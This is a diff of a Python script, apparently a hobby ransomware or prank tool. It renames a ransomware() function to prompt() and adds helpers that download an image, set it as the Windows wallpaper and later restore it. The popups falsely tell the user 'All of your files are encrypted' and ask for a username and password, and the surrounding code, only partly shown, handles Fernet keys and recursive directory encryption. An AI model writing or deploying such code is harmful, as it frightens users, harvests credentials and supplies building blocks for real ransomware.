@@ -15,6 +15,10 @@ import ctypes # so we can intereact with windows dlls and change windows backgro
 import urllib.request # used for downloading and saving background image
 from cryptography.fernet import Fernet
 
+# Variables
+
+username = os.path.expanduser("~")
+wallpath = f"{username}/OneDrive/Desktop/"
 
 # Functions
 def write_key():
@@ -114,17 +118,23 @@ def dir_decrypt():
             filename = os.path.join(dirpath,file)
             recursive_de(filename)
 
-def ransomware():
+def prompt():
     pyautogui.alert('All of your files are encrypted, check your desktop wallpaper for directions on how to get your files back', "You've been hacked!")  # always returns "OK"
     pyautogui.confirm('Asks OK or Cancel')  # returns "OK" or "Cancel"
     pyautogui.prompt('Enter your username')  # returns string or None
     pyautogui.password('Enter password')  # returns string or None
 
-def wallpaper(self):
+def bg_change():
+    global wallpath
     imageUrl = 'https://wallpaperaccess.com/full/4534773.jpg'
-    path = f'{self.sysRoot}Desktop/background.jpg'
+    path = f'{wallpath}Desktop/background.jpg'
     urllib.request.urlretrieve(imageUrl, path)
     ctypes.windll.user32.SystemParametersInfoW(20, 0, "absolute path" , 0)
+
+def bg_restore():
+    SPI_SETDESKWALLPAPER = 20
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, 'C:\Windows\Web\Wallpaper\Windows\img0.jpg', 0)
+
 
 def main():
     while True:
@@ -183,7 +193,9 @@ def main():
 
             elif slct == "7":
                 print("Check this out..")
-                ransomware()
+                bg_change()
+                prompt()
+                bg_restore()
                 print ("Haha, got ya!")
 
             elif slct == "8":
